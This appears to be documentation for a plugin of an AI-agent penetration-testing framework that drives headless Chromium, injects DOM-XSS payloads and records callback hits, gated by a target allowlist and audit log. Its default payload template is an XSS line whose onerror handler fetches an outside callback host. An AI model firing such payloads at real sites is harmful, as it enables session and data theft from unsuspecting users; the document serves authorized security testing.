# browser_attack

Headless Chromium/Playwright driver for authenticated web testing and
XSS-callback harvesting: one-shot page navigation, DOM-XSS payload injection,
and an in-memory callback registry fed by the operator's separate XSS
listener.

Source: `plugins/browser_attack/plugin.yaml`, `plugins/browser_attack/plugin.py`

## Capabilities

Manifest capabilities: `mcp_tool`. Registers four MCP tools, all wrapped
with `@ctx.require_allowlist(target_param="target_ip", audit=True)` so the
target-IP allowlist lock + JSONL audit trail apply automatically.

- `browser_attack_navigate(target_ip, url, screenshot=False)` — one-shot
  headless navigation returning page metadata (title/status, optional
  screenshot to the per-target workspace). Named to avoid colliding with the
  session-based built-in `browser_navigate`.
- `browser_dom_xss_probe(target_ip, url, payload_template="<img src=x onerror=fetch('{CALLBACK}?c={ID}')>", callback_id="")` — inject a DOM-XSS payload (URL fragment + in-page eval) pointing at the operator's XSS listener; generates a random `callback_id` when omitted.
- `browser_xss_callbacks(target_ip)` — advisory listing of recorded callback
  hits from the in-memory registry. Gated for audit consistency; no target
  touch.
- `browser_xss_record_callback(target_ip, callback_id, payload, source_ip="")` — record a hit; called by the operator's listener, not the target.

All four refuse with `BLOCKED:` unless `browser_attack.enabled` is true in
config. Requires the Playwright + Chromium stack
(`pip install playwright && playwright install chromium`).

## Config keys

```yaml
browser_attack:
  enabled: false
  browser: chromium
  headless: true
  timeout_seconds: 60
  xss_callback_host: ""
  xss_callback_port: 5555
```

| Key                 | Type   | Default     | Meaning                                                        |
|---------------------|--------|-------------|----------------------------------------------------------------|
| `enabled`           | `bool` | `false`     | Section flag; all tools refuse without it                      |
| `browser`           | `str`  | `chromium`  | Playwright browser backend name                                |
| `headless`          | `bool` | `true`      | Launch headless                                                |
| `timeout_seconds`   | `int`  | `60`        | Navigation timeout (converted to ms for Playwright)            |
| `xss_callback_host` | `str`  | `""`        | Operator XSS listener host; empty = DOM-XSS probe refuses      |
| `xss_callback_port` | `int`  | `5555`      | Operator XSS listener port                                     |

## Credentials / env vars

None. Requires the `playwright` Python package + installed Chromium (lazy
import; tools refuse with install guidance when absent).

## Usage example

Opt in (manifest ships `enabled: false`):

```yaml
plugins:
  enabled:
    - browser_attack

browser_attack:
  enabled: true
  xss_callback_host: "127.0.0.1"
  xss_callback_port: 5555

exploit:
  allowed_targets:
    - 127.0.0.1
```

Against an authorized target:

- `browser_attack_navigate(target_ip="127.0.0.1", url="http://127.0.0.1/login", screenshot=True)`
- `browser_dom_xss_probe(target_ip="127.0.0.1", url="http://127.0.0.1/search")`
- `browser_xss_callbacks(target_ip="127.0.0.1")`

## Safety / advisory-only notes

- **Authorized testing only.** Drive browsers and inject XSS payloads only
  against systems you own or are explicitly authorized to assess.
- **XSS callback hosts are target-side and never auto-authorized.**
  `browser_dom_xss_probe` re-checks `xss_callback_host` against
  `exploit.allowed_targets` and refuses with `BLOCKED:` when absent — add
  the exact `host:port` of the listener, never a wildcard. The plugin itself
  runs no listener; the operator starts one separately and feeds hits via
  `browser_xss_record_callback`.
- The callback registry is a single in-memory dict: not cross-process, lost
  on restart.
- No log clearing, timestomping, EDR/AV defeat, DoS, or malware
  distribution.
